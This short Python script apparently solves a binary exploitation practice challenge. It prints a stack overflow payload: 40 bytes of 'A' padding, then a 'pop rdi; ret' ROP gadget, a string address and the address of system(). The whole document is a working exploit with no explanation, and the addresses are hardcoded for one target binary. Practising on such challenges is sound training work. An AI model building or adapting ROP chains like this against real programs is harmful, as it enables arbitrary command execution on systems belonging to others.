import struct
crap = "A" *40

systemCallAddr = 0x0000000000400810
usefulStringAddr = 0x00601060
popRdiAddr = 0x0000000000400883 # ROP gadget: pop rdi; ret


eip = struct.pack("<Q",popRdiAddr)
rdiContent = struct.pack("<Q",usefulStringAddr)
systemCall = struct.pack("<Q",systemCallAddr)



print(crap+eip+rdiContent+systemCall)
